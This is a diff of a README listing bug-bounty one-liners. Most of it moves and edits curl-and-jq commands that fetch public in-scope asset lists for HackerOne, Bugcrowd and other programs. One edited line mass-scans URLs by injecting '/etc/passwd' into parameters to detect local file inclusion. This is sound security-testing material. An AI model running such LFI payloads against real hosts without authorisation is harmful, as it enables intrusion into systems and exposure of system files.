@@ -1,5 +1,53 @@
 > A collection of awesome one-liner scripts especially for bug bounty.
 
+### Dump In-scope Assets from `chaos-bugbounty-list`
+> @dwisiswant0
+
+```bash
+curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
+```
+
+### Dump In-scope Assets from `bounty-targets-data`
+> @dwisiswant0
+
+#### HackerOne Programs
+
+```bash
+curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
+```
+
+#### BugCrowd Programs
+
+```bash
+curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/bugcrowd_data.json  | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv' >> bugcrowdtargets.txt
+```
+
+#### Intigriti Programs
+
+```bash
+curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv' >> intigriti_targets.txt
+```
+
+#### YesWeHack Programs
+
+```bash
+curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
+```
+
+#### HackenProof Programs
+
+```bash
+curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/hackenproof_data.json  | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv' >> hackenproof_domains.txt
+
+```
+
+#### Federacy Programs
+
+```bash
+curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/federacy_data.json  | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv' >> federacydomains.txt
+```
+
+
 ## Definitions
 
 This section defines specific terms or placeholders that are used throughout one-line command/scripts.
@@ -17,7 +65,7 @@ This section defines specific terms or placeholders that are used throughout one
 > @dwisiswant0
 
 ```bash
-gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+cat domains.txt | gau | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 
 ### Open-redirect
@@ -276,52 +324,6 @@ cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
 
 ```bash
 cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
-```
-
-### Dump In-scope Assets from `chaos-bugbounty-list`
-> @dwisiswant0
-
-```bash
-curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
-```
-
-### Dump In-scope Assets from `bounty-targets-data`
-> @dwisiswant0
-
-#### HackerOne Programs
-
-```bash
-curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
-```
-
-#### BugCrowd Programs
-
-```bash
-curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
-```
-
-#### Intigriti Programs
-
-```bash
-curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
-```
-
-#### YesWeHack Programs
-
-```bash
-curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
-```
-
-#### HackenProof Programs
-
-```bash
-curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
-```
-
-#### Federacy Programs
-
-```bash
-curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
 ```
 
 ### Dump URLs from sitemap.xml
